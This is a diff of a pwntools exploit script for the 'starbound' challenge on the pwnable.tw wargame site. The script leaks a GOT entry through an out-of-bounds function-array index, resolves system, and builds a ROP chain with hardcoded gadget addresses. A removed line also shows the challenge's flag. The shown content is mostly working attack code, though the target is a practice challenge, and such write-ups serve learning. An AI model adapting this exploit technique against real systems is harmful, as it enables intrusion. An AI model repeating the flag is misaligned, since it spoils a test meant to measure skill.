@@ -1,5 +1,4 @@
 from pwn import *
-#FLAG{st4r_st4r_st4r_b0und}
 
 server = remote('chall.pwnable.tw', 10202)
 elf = ELF('./starbound')
@@ -49,10 +48,7 @@ def leak(addr):
 bss_func_array = 0x8058154
 puts_got = elf.got['puts']
 info('puts@got')
-print hexdump(puts_got)
-
 offset = int(tohex(puts_got - bss_func_array, 32), 16)
-
 # \x01: split for strtol
 
 
@@ -81,10 +77,10 @@ success('system = ' + hex(system))
 
 # Build final rop
 offset = int(tohex(nptr - bss_func_array, 32), 16)
-payload = str(offset / 4 + len(str(offset)) / 4 + 2) + '\x01' + 'A'*5
+payload = str(offset / 4 + len(str(offset)) / 4 + 2) + '\x01' + 'a'*5
 
 payload += p32(0x80496e0) # add esp, 0x1c; pop 4; ret
-payload += p32(0xdeadbee1) # -0x04
+payload += p32(0xdeadbeef) # -0x04
 payload += p32(elf.plt['read']) # -0x00
 payload += p32(0x80494da)
 payload += p32(0)
